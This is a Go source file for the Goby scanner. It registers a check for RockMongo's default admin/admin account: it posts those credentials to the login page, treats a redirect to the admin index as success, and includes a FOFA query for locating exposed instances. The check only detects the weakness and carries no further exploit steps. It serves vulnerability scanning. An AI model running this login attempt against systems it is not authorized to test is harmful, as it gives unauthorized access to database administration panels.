package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "RockMongo default account",
    "Description": "RockMongo is a MongoDB administration tool, written in PHP 5, very easy to install and use. The system has a default account.",
    "Product": "RockMongo",
    "Homepage": "https://github.com/iwind/rockmongo",
    "DisclosureDate": "2021-04-08",
    "Author": "itardc@163.com",
    "FofaQuery": "app=\"RockMongo\"",
    "Level": "3",
    "Impact": "",
    "Recommendation": "",
    "References": [
        "http://fofa.so"
    ],
    "HasExp": false,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "more=0&host=0&username=admin&password=admin&db=&lang=zh_cn&expire=3",
                "data_type": "text",
                "follow_redirect": false,
                "method": "POST",
                "uri": "/index.php?action=login.index&host=0"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "302",
                        "variable": "$code"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "location",
                        "variable": "$head"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "/index.php?action=admin.index&host=0",
                        "variable": "$head"
                    }
                ],
                "operation": "AND",
                "type": "group"
            },
            "SetVariable": [
                "keymemo|lastheader|variable|admin:admin",
                "vulurl|lastheader|variable|{{{scheme}}}://admin:admin@{{{hostinfo}}}/index.php?action=login.index&host=0"
            ]
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "defaultaccount"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "RockMongo"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "6786"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
